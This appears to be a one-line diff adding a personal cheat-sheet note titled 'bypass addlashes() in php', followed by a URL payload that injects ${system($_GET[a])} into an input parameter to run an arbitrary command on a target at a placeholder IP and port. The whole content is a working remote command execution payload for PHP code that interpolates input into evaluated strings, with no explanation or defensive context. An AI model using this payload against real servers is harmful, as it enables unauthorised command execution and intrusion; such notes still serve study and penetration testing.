@@ -1,0 +1,3 @@
+bypass `addlashes()` in php:
+	http://IP:PORT/?input=${system($_GET[a])}&a=<command>
+
